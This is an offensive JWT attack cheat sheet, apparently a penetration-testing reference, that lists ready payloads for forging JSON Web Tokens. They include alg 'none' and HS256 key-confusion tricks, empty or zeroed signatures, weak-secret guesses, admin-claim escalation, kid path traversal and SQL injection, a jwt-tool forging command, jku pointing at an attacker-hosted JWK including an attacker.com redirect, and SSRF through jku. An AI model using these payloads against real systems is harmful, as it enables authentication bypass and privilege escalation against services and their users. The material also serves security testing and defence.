# JWT Attacks — Mutation Algebra

## Dimension 1: Algorithm Header Mutations
Test all algorithm bypass forms:

| Attack | alg value | When to try |
|---|---|---|
| None attack | `none` | Always — first test |
| None case variants | `None`, `NONE`, `nOnE` | When `none` is case-checked |
| HS256 from RS256 | `HS256` | When original uses `RS256`/`ES256` |
| HS384/HS512 | `HS384`, `HS512` | When HS256 is specifically blocked |
| Embedded key | `HS256` + `jwk` header | When server trusts embedded key |

## Dimension 2: Signature Bypass Variants
- Remove signature entirely: `header.payload.` (empty signature)
- Set signature to empty string: `header.payload`
- Set signature to all zeros: `header.payload.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`
- Copy signature from another valid token: `header.payload.<copied_signature>`
- Use known weak secrets: try `secret`, `password`, `jwt_secret`, `your_jwt_secret`, app name

## Dimension 3: Claim Value Mutations
After bypass confirmed, test claim escalation paths:

### Integer ID claims (sub, userId, accountId):
- Try `"sub": 1` (often admin)
- Try `"sub": 0` (sometimes superuser)
- Try `"sub": -1` (undefined behavior in some parsers)
- Try `"sub": null` (may bypass ownership checks)

### Role/permission claims:
- `"role": "admin"` from `"role": "user"`
- `"role": ["admin", "superuser"]` (array injection)
- `"scope": "admin:all"` from `"scope": "user:read"`
- `"permissions": ["*"]` (wildcard)

### Boolean/privilege flags:
- `"isAdmin": true`, `"superuser": true`, `"verified": true`
- `"level": 99` (integer privilege level)

## Dimension 4: kid Header Injection Payloads
When `kid` claim is present in header:

| Payload | Effect |
|---|---|
| `../../dev/null` | HMAC with empty string (null device) |
| `/dev/null` | Same — absolute path |
| `../../proc/self/exe` | HMAC with binary content (unpredictable but testable) |
| `' UNION SELECT 'key' -- ` | SQL injection for key retrieval |
| `key_rsa_2048` | Try common key identifiers |

Generate valid token with empty key:
```bash
jwt-tool <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

## Dimension 5: Header Injection Mutations (jku/x5u)
For key URL injection:

1. Self-hosted JWK attack:
```json
{
  "keys": [{
    "kty": "oct",
    "k": "YOUR_BASE64URL_SECRET",
    "kid": "1"
  }]
}
```
Point `jku` to your OOB server hosting this JSON.

2. SSRF via jku: point `jku` to internal metadata endpoint — server fetches it.

3. URL allowlist bypass: `"jku": "https://allowed.domain.com/redirect?url=http://attacker.com/jwks.json"`

## Dimension 6: Parser Confusion
- Empty/null algorithm: `"alg": ""` or `"alg": null` — some parsers default to no verification
- Unknown algorithm: `"alg": "CUSTOM_ALG"` — may fall through to no verification
- Algorithm case sensitivity: `"alg": "hs256"` vs `"alg": "HS256"`
- Duplicate claims: `{"exp": 9999999999, "exp": 1000000000}` — parser uses first, validator uses second
